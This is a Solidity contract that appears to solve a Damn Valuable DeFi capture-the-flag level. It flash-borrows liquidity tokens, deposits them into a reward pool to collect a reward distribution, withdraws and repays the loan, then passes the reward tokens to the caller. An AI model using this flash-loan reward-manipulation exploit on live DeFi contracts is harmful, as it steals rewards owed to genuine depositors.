pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "hardhat/console.sol";
import "./RewardToken.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external;
}

contract Challenge5Attack {
    IFlashLoanerPool public flashloanpool;
    ITheRewardPool public rewardpool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardtoken;

    constructor(address liquidityTokenAddress, address flashloaneraddress, address rewardpooladdress, address rewardtokenaddress) public {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        flashloanpool = IFlashLoanerPool(flashloaneraddress);
        rewardpool = ITheRewardPool(rewardpooladdress);
        rewardtoken = RewardToken(rewardtokenaddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        rewardpool.deposit(amount);
        rewardpool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
    }

    function attack(uint256 amount) external {
        liquidityToken.approve(address(rewardpool), amount);
        flashloanpool.flashLoan(amount);  
        rewardtoken.transfer(msg.sender, rewardtoken.balanceOf(address(this)));
    }
}